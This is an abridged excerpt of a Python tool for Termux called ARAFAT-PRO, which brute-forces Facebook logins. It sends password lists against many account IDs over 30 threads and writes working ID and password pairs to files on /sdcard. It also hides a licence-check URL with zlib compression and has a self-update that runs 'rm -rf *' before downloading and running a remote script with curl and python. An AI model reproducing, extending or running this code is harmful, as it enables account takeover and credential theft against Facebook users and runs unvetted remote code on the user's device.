...
try:
        key1 = open('/data/data/com.termux/files/usr/bin/.mrARAFATxxx-cov', 'r').read()
except:
        kok=open('/data/data/com.termux/files/usr/bin/.mrARAFATxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrARAFATxxx-cov', 'r').read()
kex=(f"ARAFAT-XD{uid}TS{key1}PX110E==")
...
def chk():
        ...
        if ua not in urll:
                ...
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for ARAFAT New update ');exit()
                else:
...
try:
        ...
        if updt in linx:
                ...
                print('\n ARAFAT-PRO Update Done Wait for installing...\n')
                os.system('cd $HOME && cd ARAFAT-PRO')
                os.system('rm -rf *')
                os.system("curl -L https://raw.githubusercontent.com/ARAFAT110/ARAFAT-PRO/main/ARAFAT.py -o ARAFAT.py && python ARAFAT.py")
        ...
        try:
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/ARAFAT_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi ARAFAT Sir, I Need To Buy Your Paid ARAFAT PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ARAFAT.py')
                        linex()
                        exit()
        except ValueError:
                exit()
...
def pak():
                ...
                with tred(max_workers=30) as ARAFAT:     
                        ...
                        for psx in user:
                                ...
                                ARAFAT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ARAFAT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in ARAFAT:
                                print('\r\r\033[1;32m [ARAFAT-OK] %s | %s'%(ids,pas))
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ARAFAT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ARAFAT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ARAFAT-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [ARAFAT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ARAFAT-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
